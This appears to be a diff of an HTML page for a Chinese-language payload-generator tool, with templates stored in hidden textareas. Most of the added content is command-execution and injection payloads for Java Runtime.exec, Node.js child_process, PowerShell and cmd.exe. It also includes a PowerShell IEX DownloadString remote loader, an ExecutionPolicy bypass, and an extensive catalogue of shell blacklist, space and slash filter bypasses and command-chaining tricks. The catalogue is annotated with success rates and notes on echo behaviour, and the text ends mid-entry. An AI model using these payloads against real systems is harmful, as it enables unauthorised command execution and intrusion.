@@ -9,7 +9,14 @@
     <link rel="stylesheet" type="text/css" href="../../css/style.css">
 
     <style>
-        /* Page Specific Overrides */
+        body {
+            display: grid;
+            grid-template-rows: auto 1fr auto;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
         .main-content {
             padding: 40px 20px;
             max-width: 1000px;
@@ -91,6 +98,160 @@
             outline: none;
             border-color: var(--primary-color);
             box-shadow: var(--shadow-glow);
+        }
+
+        /* Preset Commands Dropdown */
+        .input-with-presets {
+            display: flex;
+            gap: 0;
+        }
+
+        .input-with-presets input {
+            flex: 1;
+            border-radius: 0;
+            border-right: none;
+        }
+
+        .preset-btn {
+            padding: 12px 15px;
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            color: var(--primary-color);
+            cursor: pointer;
+            font-size: 12px;
+            transition: all 0.3s ease;
+            border-radius: 0;
+        }
+
+        .preset-btn:hover {
+            background: var(--primary-color);
+            color: var(--bg-color);
+        }
+
+        .preset-menu {
+            position: absolute;
+            top: 100%;
+            left: 0;
+            right: 0;
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            border-top: none;
+            max-height: 400px;
+            overflow-y: auto;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+        }
+
+        .preset-category {
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .preset-category:last-child {
+            border-bottom: none;
+        }
+
+        .preset-category strong {
+            color: var(--primary-color);
+            font-size: 0.85rem;
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        .preset-item {
+            padding: 8px 12px;
+            margin: 4px 0;
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            cursor: pointer;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text-primary);
+            transition: all 0.2s ease;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .preset-item:hover {
+            border-color: var(--primary-color);
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--primary-color);
+        }
+
+        .input-block {
+            position: relative;
+        }
+
+        /* Environment Selector */
+        .env-selector {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 15px;
+            padding: 15px;
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+        }
+
+        .env-selector-label {
+            width: 100%;
+            color: var(--primary-color);
+            font-size: 0.85rem;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+
+        .env-chip {
+            padding: 6px 14px;
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 20px;
+            cursor: pointer;
+            font-family: var(--font-mono);
+            font-size: 0.8rem;
+            color: var(--text-secondary);
+            transition: all 0.2s ease;
+            user-select: none;
+        }
+
+        .env-chip:hover {
+            border-color: var(--primary-color);
+            color: var(--primary-color);
+        }
+
+        .env-chip.active {
+            background: var(--primary-color);
+            border-color: var(--primary-color);
+            color: #000;
+            font-weight: bold;
+        }
+
+        .env-chip.active:hover {
+            background: var(--primary-color);
+            opacity: 0.9;
+        }
+
+        .env-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            align-items: center;
+        }
+
+        .env-group-label {
+            color: var(--text-secondary);
+            font-size: 0.75rem;
+            margin-right: 5px;
+        }
+
+        .env-divider {
+            width: 1px;
+            height: 24px;
+            background: var(--border-color);
+            margin: 0 8px;
         }
 
         textarea.form-control {
@@ -187,7 +348,7 @@
             position: relative;
             margin: 0;
         }
-        
+
         .hint-section .hint-code {
             background: var(--bg-color);
             border: 1px solid var(--border-color);
@@ -231,47 +392,7 @@
             margin: 40px 0;
         }
 
-        /* Hint Modal */
-        .hint-lightbulb {
-            position: fixed;
-            bottom: 80px;
-            /* raised from 20px */
-            right: 20px;
-            width: 50px;
-            height: 50px;
-            background: linear-gradient(135deg, var(--primary-color), var(--accent-color));
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0, 255, 65, 0.4);
-            z-index: 9998;
-            transition: all 0.3s ease;
-            animation: pulse 2s infinite;
-        }
-
-        .hint-lightbulb:hover {
-            transform: scale(1.1);
-            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.6);
-        }
-
-        .hint-lightbulb::before {
-            content: '💡';
-            font-size: 24px;
-        }
-
-        @keyframes pulse {
-
-            0%,
-            100% {
-                box-shadow: 0 4px 12px rgba(0, 255, 65, 0.4);
-            }
-
-            50% {
-                box-shadow: 0 4px 20px rgba(0, 255, 65, 0.7);
-            }
-        }
+        /* Hint Modal handled globally in style.css */
 
         .interactive-hint {
             position: fixed;
@@ -297,10 +418,27 @@
             padding: 40px;
             border: 1px solid var(--primary-color);
             box-shadow: var(--shadow-glow);
-            max-width: 600px;
+            max-width: 800px;
+            max-height: 85vh;
+            overflow-y: auto;
             margin: 0 20px;
-            text-align: center;
+            text-align: left;
             position: relative;
+        }
+
+        .hint-content h3 {
+            color: var(--primary-color);
+            font-size: 1rem;
+            margin-top: 20px;
+            margin-bottom: 10px;
+        }
+
+        .hint-content code {
+            background: rgba(0, 255, 65, 0.1);
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: var(--font-mono);
+            color: var(--primary-color);
         }
 
         .hint-content::before {
@@ -359,6 +497,15 @@
                 opacity: 1;
             }
         }
+
+        /* Standardized Footer Overrides */
+        .unified-footer {
+            margin-top: 0 !important;
+            padding: 1.5rem 0 !important;
+            flex-shrink: 0;
+            background: var(--surface-color) !important;
+            border-top: 1px solid var(--border-color) !important;
+        }
     </style>
 </head>
 
@@ -366,148 +513,546 @@
     <!-- 导航栏 -->
     <div id="navigation-container"></div>
     <script>
-        // Load Navigation asynchronously to avoid blocking and CORS issues
-        (function() {
-            const navContainer = document.getElementById('navigation-container');
-            if (!navContainer) return;
-            
-            // Try fetch first (works in most modern browsers)
-            if (typeof fetch !== 'undefined') {
-                fetch('../../navigation.html')
-                    .then(response => {
-                        if (response.ok) {
-                            return response.text();
-                        }
-                        throw new Error('Network response was not ok');
-                    })
-                    .then(html => {
-                        navContainer.innerHTML = html;
-                    })
-                    .catch(error => {
-                        console.warn('Failed to load navigation via fetch:', error);
-                        // Fallback to async XHR
-                        loadNavigationAsync();
+        // Load Navigation synchronously to prevent page flash/jitter
+        (function () {
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', '../../navigation.html', false); // Synchronous to prevent flash
+            try {
+                xhr.send();
+                if (xhr.status === 200 || xhr.status === 0) { // 0 for file:// protocol
+                    const container = document.getElementById('navigation-container');
+                    container.innerHTML = xhr.responseText;
+
+                    // Manually execute scripts
+                    const scripts = container.querySelectorAll('script');
+                    scripts.forEach(oldScript => {
+                        const newScript = document.createElement('script');
+                        Array.from(oldScript.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value));
+                        newScript.textContent = oldScript.textContent;
+                        document.body.appendChild(newScript);
                     });
-            } else {
-                // Fallback to async XHR for older browsers
-                loadNavigationAsync();
-            }
-            
-            function loadNavigationAsync() {
-                try {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open('GET', '../../navigation.html', true); // Async
-                    xhr.onload = function() {
-                        if (xhr.status === 200 || xhr.status === 0) { // 0 for file:// protocol
-                            navContainer.innerHTML = xhr.responseText;
-                        }
-                    };
-                    xhr.onerror = function() {
-                        console.warn('Failed to load navigation via XHR');
-                    };
-                    xhr.send();
-                } catch(e) {
-                    console.warn('Failed to load navigation:', e);
                 }
+            } catch (e) {
+                console.error('Failed to load navigation:', e);
             }
         })();
     </script>
 
     <!-- 主要内容 -->
-    <div class="main-content">
+    <main class="main-content">
 
         <!-- payloads template (Hidden) -->
         <textarea id="data0" hidden="true">arr0w1_cmd_origin</textarea>
 
+        <!-- 1. Java Runtime.exec() - String[] -->
         <textarea id="data1" hidden="true">
-1⃣️ 参数类型 String[]
-java.lang.Runtime.getRuntime().exec​(String[] cmdarray)    
-Executes the specified command and arguments in a separate process.
-
-例
-java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","echo '123' > ~/Downloads/111.txt"});
-
-🔥实际payload - for Linux/macOS 【成功率很高】
+🔥[Java] [Linux/macOS] /bin/sh -c
+📌前提: Java环境, /bin/sh可用
+📌成功率高, 支持特殊字符
+📌回显: ❌无 (exec()返回Process对象, 需读取getInputStream()获取输出)
 java.lang.Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","arr0w1_cmd_origin"});
+🔥[Java] [Linux] /bin/bash -c
+📌前提: Java环境, /bin/bash可用
+📌成功率高, 支持Bash特性
+📌回显: ❌无 (需读取Process.getInputStream())
+java.lang.Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","arr0w1_cmd_origin"});
+🔥[Java] [Windows] cmd.exe /c
+📌前提: Java环境, Windows系统
+📌执行后关闭cmd窗口
+📌回显: ❌无 (需读取Process.getInputStream())
+java.lang.Runtime.getRuntime().exec(new String[]{"cmd.exe","/c","arr0w1_cmd_origin"});
+🔥[Java] [Windows] PowerShell -c
+📌前提: Java环境, PowerShell可用
+📌支持更复杂的命令
+📌回显: ❌无 (需读取Process.getInputStream())
+java.lang.Runtime.getRuntime().exec(new String[]{"powershell.exe","-c","arr0w1_cmd_origin"});
 </textarea>
 
+        <!-- 2. Java Runtime.exec() - String (Base64 encoded) -->
         <textarea id="data2" hidden="true">
-2⃣️ 参数类型 String
-参数类型: 字符串
-如 Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
-注意: 当有 ( ) { } < >| & ; ~ 等字符时 则命令执行失败!
-
-🔥实际payload【成功率很高】 支持Linux 不支持macOS
+🔥[Java] [Linux] Brace expansion + Base64
+📌用途: Runtime.exec(String) 单字符串参数
+📌前提: Java环境, /bin/bash可用, base64命令存在
+📌注意: Linux用 -d, 必须通过bash执行(zsh不支持)
+📌回显: ❌无 (需读取Process.getInputStream())
 /bin/bash -c {echo,arr0w1_base64}|{base64,-d}|bash
-
-
-🔥实际payload 【成功率低】
-注意: 当有 ( ) { } < >| & ; ~ 等字符时 则命令执行失败!
-/bin/bash -c $@|bash 0 arr0w1_cmd_origin
-/bin/bash -c $*|bash 0 arr0w1_cmd_origin
+🔥[Java] [macOS] Brace expansion + Base64
+📌用途: Runtime.exec(String) 单字符串参数
+📌前提: Java环境, /bin/bash可用, base64命令存在
+📌注意: macOS用 -D (大写), 必须通过bash执行(zsh不支持)
+📌回显: ❌无 (需读取Process.getInputStream())
+/bin/bash -c {echo,arr0w1_base64}|{base64,-D}|bash
+🔥[Java] [Linux] $@ expansion
+📌用途: Runtime.exec(String) 单字符串参数
+📌前提: Java环境, bash可用
+📌注意: 命令中不能有特殊字符 (){}[]<>|&;
+📌回显: ❌无 (需读取Process.getInputStream())
+/bin/bash -c $@|bash 0 echo arr0w1_cmd_origin
+🔥[Java] [Linux] $* expansion
+📌用途: Runtime.exec(String) 单字符串参数
+📌前提: Java环境, bash可用
+📌注意: 命令中不能有特殊字符 (){}[]<>|&;
+📌回显: ❌无 (需读取Process.getInputStream())
+/bin/bash -c $*|bash 0 echo arr0w1_cmd_origin
+🔥[Java] [Linux] $0 here-string
+📌用途: Runtime.exec(String) 单字符串参数
+📌前提: Java环境, bash可用
+📌使用here-string传递命令
+📌回显: ❌无 (需读取Process.getInputStream())
+/bin/bash -c $0<<<arr0w1_cmd_origin bash
 </textarea>
 
+        <!-- 3. Shell Encoding (Base64/Hex/Obfuscation) - 直接在终端执行 -->
         <textarea id="data3" hidden="true">
-3⃣️ base64编码 - 使用base64命令
-支持Linux 不支持macOS
-🔥实际payload
+🔥[Shell] [Linux] Base64 - Brace expansion (Bash Only)
+📌用途: 在Bash终端执行, zsh不支持此语法!
+📌前提: bash, base64命令
+📌回显: ✅有 (终端直接显示输出)
 {echo,arr0w1_base64}|{base64,-d}|bash
-
-
-4⃣️ base64编码 - 使用perl中的base64语句
-支持Linux/macOS
-🔥实际payload
+🔥[Shell] [macOS] Base64 - Brace expansion (Bash Only)
+📌用途: 在Bash终端执行, zsh不支持此语法!
+📌前提: bash, base64命令, macOS用 -D
+📌回显: ✅有 (终端直接显示输出)
+{echo,arr0w1_base64}|{base64,-D}|bash
+🔥[Shell] [Linux] Base64 - echo + pipe
+📌用途: 直接在终端/Shell执行
+📌前提: bash/zsh, base64命令
+📌回显: ✅有 (终端直接显示输出)
+echo 'arr0w1_base64'|base64 -d|bash
+🔥[Shell] [macOS] Base64 - echo + pipe
+📌用途: 直接在终端/Shell执行
+📌前提: bash/zsh, base64命令, macOS用 -D
+📌回显: ✅有 (终端直接显示输出)
+echo 'arr0w1_base64'|base64 -D|bash
+🔥[Shell] [Linux] Base64 - bash -c wrapper
+📌用途: 直接在终端/Shell执行, 或作为参数传递
+📌前提: bash, base64命令
+📌回显: ✅有 (终端直接显示输出)
+bash -c 'echo arr0w1_base64|base64 -d|bash'
+🔥[Shell] [macOS] Base64 - bash -c wrapper
+📌用途: 直接在终端/Shell执行, 或作为参数传递
+📌前提: bash, base64命令, macOS用 -D
+📌回显: ✅有 (终端直接显示输出)
+bash -c 'echo arr0w1_base64|base64 -D|bash'
+🔥[Shell] [Linux/macOS] Base64 - Perl
+📌用途: 直接在终端/Shell执行
+📌前提: perl, MIME::Base64模块
+📌回显: ✅有 (终端直接显示输出)
 perl -MMIME::Base64 -e 'exec decode_base64("arr0w1_base64")'
-
-5⃣️ hex编码
-支持Linux/macOS
-如果命令字符串 包含了 shell下的特殊字符 < > | & ; 自动不对它们做hex编码, 使命令执行成功.
-如果命令字符串 包含了 { } ( ) 则必然失败!
-🔥实际payload
-`echo -e "ascii_2_Hex_without_black_chars_flag"`
+🔥[Shell] [Linux/macOS] Base64 - Python3
+📌用途: 直接在终端/Shell执行
+📌前提: python3
+📌回显: ✅有 (终端直接显示输出)
+python3 -c "import base64,os;os.system(base64.b64decode('arr0w1_base64').decode())"
+🔥[Shell] [Linux/macOS] Hex - echo|bash (推荐)
+📌用途: 直接在终端/Shell执行
+📌前提: bash/zsh, echo -e支持
+📌优势: 支持 | & ; && || 等所有shell语法
+📌回显: ✅有 (终端直接显示输出)
+echo -e "arr0w1_hex_full"|bash
+🔥[Shell] [Linux/macOS] Hex - eval (推荐)
+📌用途: 直接在终端/Shell执行
+📌前提: bash/zsh
+📌优势: 支持 | & ; && || 等所有shell语法
+📌回显: ✅有 (终端直接显示输出)
+eval $(echo -e "arr0w1_hex_full")
 </textarea>
 
+        <!-- 4. Node.js child_process -->
         <textarea id="data4" hidden="true">
-如
-require('child_process').exec('echo \'asd\' > ~/Downloads/11111.txt');//
-require('\x63hild_process').exec('/System/Applications/Calculator.app/Contents/MacOS/Cal\u0063ulator')
-
-ascii to Hex
-c        \x63
-
-UTF-16 to Hex
-c        \u0063
-
-🔥实际payload
+🔥[Node.js] [Linux/macOS/Windows] require() - Direct
+📌前提: Node.js环境
+📌最简单的方式, 异步执行
+📌回显: ❌无 (exec是异步的, 需要callback获取输出)
 require('child_process').exec('arr0w1_cmd_origin');//
-
-🔥实际payload (unicode)
-require('\x63hild_process').exec('arr0w1_cmd_ascii2hex');//
-
-🔥实际payload (base64)
-require('\x63hild_process').exec(Buffer.from('arr0w1_base64', 'base64').toString('utf-8'));//
-
+🔥[Node.js] [Linux/macOS/Windows] require() - Hex module name
+📌前提: Node.js环境
+📌绕过 "child_process" 字符串过滤
+📌回显: ❌无 (异步执行, 需callback)
+require('\x63hild_process').exec('arr0w1_cmd_origin');//
+🔥[Node.js] [Linux/macOS/Windows] require() - Unicode + Hex command
+📌前提: Node.js环境
+📌绕过模块名和命令的字符串过滤
+📌回显: ❌无 (异步执行, 需callback)
+require('\u0063hild_process').exec('arr0w1_cmd_ascii2hex');//
+🔥[Node.js] [Linux/macOS/Windows] require() - Base64 command
+📌前提: Node.js环境
+📌绕过命令内容过滤
+📌回显: ❌无 (异步执行, 需callback)
+require('child_process').exec(Buffer.from('arr0w1_base64','base64').toString());//
+🔥[Node.js] [Linux/macOS/Windows] execSync - Synchronous
+📌前提: Node.js环境
+📌同步执行, 可获取输出
+📌回显: ✅有 (返回Buffer, .toString()转字符串)
+require('child_process').execSync('arr0w1_cmd_origin').toString();//
+🔥[Node.js] [Linux/macOS] spawnSync - /bin/sh
+📌前提: Node.js环境, /bin/sh可用
+📌更底层的进程控制
+📌回显: ✅有 (stdout属性包含输出)
+require('child_process').spawnSync('/bin/sh',['-c','arr0w1_cmd_origin']).stdout.toString();//
+🔥[Node.js] [Windows] spawnSync - cmd.exe
+📌前提: Node.js环境, Windows系统
+📌更底层的进程控制
+📌回显: ✅有 (stdout属性包含输出)
+require('child_process').spawnSync('cmd.exe',['/c','arr0w1_cmd_origin']).stdout.toString();//
+🔥[Node.js] [Linux/macOS/Windows] global.process.mainModule
+📌前提: Node.js环境
+📌绕过直接require的限制
+📌回显: ❌无 (异步执行, 需callback)
+global.process.mainModule.require('child_process').exec('arr0w1_cmd_origin');//
 </textarea>
 
+        <!-- 5. PowerShell / cmd.exe -->
         <textarea id="data5" hidden="true">
+🔥[Shell] [Windows] PowerShell - Direct
+📌前提: PowerShell可用
+📌基本执行方式
+📌回显: ✅有 (终端直接显示输出)
+powershell -c "arr0w1_cmd_origin"
+🔥[Shell] [Windows] PowerShell - EncodedCommand
+📌前提: PowerShell可用
+📌Base64编码(UTF-16LE), 绕过特殊字符
+📌回显: ✅有 (终端直接显示输出)
+powershell -enc arr0w1_base64_utf16
+🔥[Shell] [Windows] PowerShell - IEX DownloadString
+📌前提: PowerShell可用, 网络访问
+📌远程加载脚本, 输入应为URL
+📌回显: ✅有 (执行下载脚本的输出)
+powershell -c "IEX(New-Object Net.WebClient).DownloadString('arr0w1_cmd_origin')"
+🔥[Shell] [Windows] PowerShell - Bypass ExecutionPolicy
+📌前提: PowerShell可用
+📌绕过脚本执行策略限制
+📌回显: ✅有 (终端直接显示输出)
+powershell -ep bypass -c "arr0w1_cmd_origin"
+🔥[Shell] [Windows] cmd.exe /c
+📌前提: Windows系统
+📌执行后关闭窗口
+📌回显: ✅有 (终端直接显示输出)
+cmd /c arr0w1_cmd_origin
+🔥[Shell] [Windows] cmd.exe /k
+📌前提: Windows系统
+📌执行后保持窗口打开
+📌回显: ✅有 (终端直接显示输出)
+cmd /k arr0w1_cmd_origin
 </textarea>
 
+        <!-- 6. Filter Bypass Techniques - Based on PayloadsAllTheThings -->
         <textarea id="data6" hidden="true">
+═══════════════════════════════════════════════════════════════
+📌回显说明: 以下Bypass技术均在Shell中直接执行
+📌终端执行时 ✅有回显, 漏洞注入时取决于应用是否返回stdout
+═══════════════════════════════════════════════════════════════
+🔶 命令名绕过 (Bypass Command Blacklist)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux/macOS] Single Quote - 空引号插入
+📌绕过: 命令关键字黑名单 (如过滤 cat, whoami 等)
+📌原理: 空单引号被shell忽略, wh''oami = whoami
+📌示例: cat /etc/passwd → c''at /etc/passwd
+arr0w1_sq_empty
+🔥[Shell] [Linux/macOS] Single Quote - 引号包裹开头
+📌绕过: 命令关键字黑名单
+📌原理: 'wh'oami 中 'wh' 被原样输出后拼接
+📌示例: whoami → 'who'ami
+arr0w1_sq_wrap_start
+🔥[Shell] [Linux/macOS] Single Quote - 引号包裹中间
+📌绕过: 命令关键字黑名单
+📌原理: 单引号可包裹命令任意部分
+📌示例: whoami → w'hoa'mi
+arr0w1_sq_wrap_mid
+🔥[Shell] [Linux/macOS] Double Quote - 空引号插入
+📌绕过: 命令关键字黑名单
+📌原理: 空双引号被shell忽略, wh""oami = whoami
+📌示例: cat /etc/passwd → c""at /etc/passwd
+arr0w1_dq_empty
+🔥[Shell] [Linux/macOS] Double Quote - 引号包裹开头
+📌绕过: 命令关键字黑名单
+📌原理: "wh"oami 中 "wh" 被原样输出后拼接
+📌示例: whoami → "who"ami
+arr0w1_dq_wrap_start
+🔥[Shell] [Linux/macOS] Double Quote - 引号包裹中间
+📌绕过: 命令关键字黑名单
+📌原理: 双引号可包裹命令任意部分
+📌示例: whoami → w"hoa"mi
+arr0w1_dq_wrap_mid
+🔥[Shell] [Linux/macOS] Backslash - 单个反斜杠
+📌绕过: 命令关键字黑名单
+📌原理: 反斜杠转义普通字符不改变其值, w\hoami = whoami
+📌示例: cat /etc/passwd → c\at /etc/passwd
+arr0w1_bs_single
+🔥[Shell] [Linux/macOS] Backslash - 全字符反斜杠
+📌绕过: 命令关键字黑名单 (强力混淆)
+📌原理: 每个字符前都加反斜杠
+📌示例: cat → c\a\t
+arr0w1_bs_all
+🔥[Shell] [Linux/macOS] Backtick - 空反引号插入
+📌绕过: 命令关键字黑名单
+📌原理: 空反引号``执行结果为空字符串
+📌示例: whoami → who``ami
+arr0w1_backtick_empty
+🔥[Shell] [Linux/macOS] $@ - 空位置参数
+📌绕过: 命令关键字黑名单
+📌原理: $@ 在脚本外或无参数时展开为空
+📌示例: whoami → who$@ami
+arr0w1_dollar_at
+🔥[Shell] [Linux/macOS] $() - 空命令替换
+📌绕过: 命令关键字黑名单
+📌原理: $() 内无命令时结果为空
+📌示例: whoami → who$()ami
+arr0w1_dollar_paren
+🔥[Shell] [Linux/macOS] ${x} - 未定义变量
+📌绕过: 命令关键字黑名单
+📌原理: ${x} 未定义变量展开为空 (x可为任意未定义变量名)
+📌示例: whoami → who${z}ami 或 who${null}ami
+arr0w1_dollar_var
+🔥[Shell] [Linux/macOS] Wildcard ? - 通配符匹配 (推荐)
+📌绕过: 命令名/路径被过滤
+📌原理: ? 匹配任意单个字符, 必须包含路径前缀!
+📌注意: 单独 i? 会匹配当前目录文件报错!
+📌示例: id → /???/???/i? (匹配 /usr/bin/id)
+arr0w1_wildcard_question
+🔥[Shell] [Linux/macOS] Wildcard * - 通配符匹配 (⚠️不推荐)
+📌绕过: 命令名/路径被过滤
+📌原理: * 匹配任意字符序列
+📌风险: * 经常匹配多个文件导致错误!
+📌示例: /usr/bin/uni* 会匹配 unifdef, uniq, units 导致执行错误命令!
+📌建议: 优先使用 ? 通配符，更精确可控
+arr0w1_wildcard_asterisk
+🔥[Shell] [Windows] 大小写混合
+📌绕过: Windows命令名过滤 (大小写不敏感)
+📌原理: Windows/CMD命令不区分大小写
+📌示例: whoami → WhOaMi, WHOAMI, wHoAmI
+📌注意: Linux/macOS区分大小写, 此方法无效
+arr0w1_cmd_random_case
+═══════════════════════════════════════════════════════════════
+🔶 空格绕过 (Bypass Space Filter)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux] ${IFS} - 内部字段分隔符 (Bash Only)
+📌绕过: 空格字符过滤
+📌原理: Bash中${IFS}默认值包含空格, 可替代空格
+📌示例: cat /etc/passwd → cat${IFS}/etc/passwd
+📌注意: zsh不支持! 不能用在引号内(如awk)!
+arr0w1_cmd_ifs
+🔥[Shell] [Linux] $IFS - 简写形式 (Bash Only)
+📌绕过: 空格字符过滤
+📌原理: $IFS 等同于 ${IFS}, 更短的写法
+📌示例: cat /etc/passwd → cat$IFS/etc/passwd
+📌注意: zsh不支持! 不能用在引号内!
+arr0w1_cmd_ifs_short
+🔥[Shell] [Linux] Brace Expansion - 花括号展开 (Bash Only)
+📌绕过: 空格字符过滤
+📌原理: {a,b,c} 展开为 a b c, 无需空格分隔
+📌示例: cat /etc/passwd → {cat,/etc/passwd}
+📌示例: echo hello world → {echo,hello,world}
+📌注意: zsh不支持此语法!
+arr0w1_brace_expansion
+🔥[Shell] [Linux/macOS] < 输入重定向 - 无空格读取文件
+📌绕过: 空格过滤 (仅限文件读取场景)
+📌原理: < 将文件内容作为stdin传递给命令, 无需空格
+📌正确: cat</etc/passwd (等同于 cat < /etc/passwd)
+📌正确: head</etc/passwd
+📌正确: grep root</etc/passwd (等同于 grep root < /etc/passwd)
+📌错误: ls<-la (< 不能替代命令参数中的空格!)
+📌限制: 只能用于最后一个参数是文件路径的场景
+arr0w1_input_redirect
+═══════════════════════════════════════════════════════════════
+🔶 斜杠绕过 (Bypass Slash Filter)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux/macOS] ${HOME:0:1} - 获取斜杠字符
+📌绕过: 斜杠 / 字符被过滤
+📌原理: ${HOME} 通常为 /home/user, ${HOME:0:1} 提取第一个字符 /
+📌示例: /etc/passwd → ${HOME:0:1}etc${HOME:0:1}passwd
+arr0w1_home_slash
+🔥[Shell] [Linux/macOS] ${PWD:0:1} - 获取斜杠字符(变体)
+📌绕过: 斜杠 / 字符被过滤 (${HOME}被过滤时使用)
+📌原理: ${PWD} 为当前目录路径, ${PWD:0:1} 提取第一个字符 /
+📌示例: /etc/passwd → ${PWD:0:1}etc${PWD:0:1}passwd
+arr0w1_pwd_slash
+═══════════════════════════════════════════════════════════════
+🔶 编码绕过 (Encoding Bypass)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux/macOS] Hex编码 - echo|bash 执行
+📌绕过: 命令/路径中特殊字符过滤
+📌原理: echo -e 解释 \xNN, 管道到 bash 执行
+📌注意: 必须用 |bash 或 eval, 支持 && || ;
+📌示例: id && whoami → echo -e "\x69\x64..."|bash
+arr0w1_hex_echo
+🔥[Shell] [Linux/macOS] Hex编码 - eval执行
+📌绕过: 命令/路径中特殊字符过滤
+📌原理: eval 将字符串作为 shell 命令执行
+📌示例: eval $(echo -e "\x69\x64")
+arr0w1_hex_eval
+🔥[Shell] [Linux/macOS] Hex编码 - $'...' ANSI-C引用
+📌绕过: 命令/路径中特殊字符过滤
+📌原理: $'...' 语法支持 \xNN 转义序列
+📌陷阱: $'...' 结果是单个字符串, 不会解析 && || ; !
+📌错误: $'\x69\x64\x20\x26\x26...' → "id &&..." 作为一个命令名!
+📌正确: 简单命令用 $'\x69\x64', 复杂命令自动用 eval $'...'
+arr0w1_hex_ansi
+═══════════════════════════════════════════════════════════════
+🔶 Shell执行绕过 (Shell Path Bypass)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux/macOS] $0 - 当前Shell执行
+📌绕过: bash, sh, zsh 等shell名被过滤
+📌原理: $0 在交互式shell中是当前shell路径
+📌示例: bash -c "whoami" → echo whoami|$0
+📌用法: 通过管道将命令传给当前shell
+echo arr0w1_cmd_origin|$0
+🔥[Shell] [Linux/macOS] $SHELL - 环境变量执行
+📌绕过: /bin/bash, /bin/sh 等路径被过滤
+📌原理: $SHELL 环境变量存储用户默认shell路径
+📌示例: /bin/bash -c "id" → $SHELL -c 'id'
+$SHELL -c 'arr0w1_cmd_origin'
+═══════════════════════════════════════════════════════════════
+🔶 命令链接/注入 (Command Chaining)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux/macOS/Windows] ; - 分号命令链接
+📌用途: 命令注入
+📌原理: 分号分隔多个命令, 顺序执行
+📌示例: ping -c1 127.0.0.1;id (先ping后执行id)
+📌注入: input;malicious_cmd
+;arr0w1_cmd_origin
+🔥[Shell] [Linux/macOS/Windows] | - 管道命令链接
+📌用途: 命令注入
+📌原理: 管道将前一命令的stdout传给后一命令的stdin
+📌示例: echo "test"|base64 
+📌注入: input|malicious_cmd
+|arr0w1_cmd_origin
+🔥[Shell] [Linux/macOS/Windows] && - AND逻辑链接
+📌用途: 命令注入 (⚠️不能单独执行!)
+📌原理: 仅当前一命令成功(exit 0)时执行后一命令
+📌示例: ls /tmp && cat /etc/passwd (前面必须有命令)
+📌注入: 在参数中注入 "valid_value && malicious_cmd"
+📌错误: 直接执行 "&&cmd" 会报 parse error near &&
+📌回显: ✅有 (取决于注入的命令)
+&&arr0w1_cmd_origin
+🔥[Shell] [Linux/macOS/Windows] || - OR逻辑链接
+📌用途: 命令注入 (⚠️不能单独执行!)
+📌原理: 仅当前一命令失败(exit非0)时执行后一命令
+📌示例: ls /nonexistent || whoami (前面必须有命令)
+📌注入: 在参数中注入 "invalid_value || malicious_cmd"
+📌错误: 直接执行 "||cmd" 会报 parse error near ||
+📌回显: ✅有 (取决于注入的命令)
+||arr0w1_cmd_origin
+🔥[Shell] [Linux/macOS/Windows] false || - 强制执行OR
+📌用途: 独立执行 (✅可直接运行)
+📌原理: false命令总是返回1(失败), 所以||后的命令必定执行
+📌示例: false || whoami (whoami必定执行)
+📌优势: 不依赖前置命令失败, 可独立使用
+📌回显: ✅有 (取决于后面的命令)
+false||arr0w1_cmd_origin
+🔥[Shell] [Linux/macOS] $() - 命令替换注入
+📌用途: 命令注入 (内联执行)
+📌原理: $() 在子shell执行命令并将输出替换到当前位置
+📌示例: echo $(whoami) → 输出当前用户名
+📌回显: ⚠️特殊 (输出被替换到命令中, 需配合echo等显示)
+$(arr0w1_cmd_origin)
+🔥[Shell] [Linux/macOS] `` - 反引号命令替换
+📌用途: 命令注入 (旧式语法)
+📌原理: 反引号内命令被执行, 输出替换到当前位置
+📌陷阱: `id` 执行后输出 uid=503... 会被当作命令执行!
+📌回显: ⚠️特殊 (输出被替换, 可能报错但命令已执行, 适合盲注/OOB)
+📌适用: 盲注/带外(OOB)可行, 直接回显不行
+📌正确: echo `id` 或 result=`id` (将输出作为参数/赋值)
+`arr0w1_cmd_origin`
+═══════════════════════════════════════════════════════════════
+🔶 后台/持久执行 (Background Execution)
+═══════════════════════════════════════════════════════════════
+🔥[Shell] [Linux/macOS] & - 后台执行
+📌绕过: 命令执行超时检测
+📌原理: & 使命令在后台异步执行, 立即返回
+📌示例: sleep 100 → sleep 100 & (不阻塞)
+📌回显: ❌无 (后台执行, 输出不返回, 适合反弹shell)
+arr0w1_cmd_origin &
+🔥[Shell] [Linux/macOS] nohup - 持久后台执行
+📌绕过: 进程超时/SSH断开终止
+📌原理: nohup 使进程忽略SIGHUP信号, 父进程退出后继续运行
+📌回显: ❌无 (后台执行, 输出写入nohup.out文件)
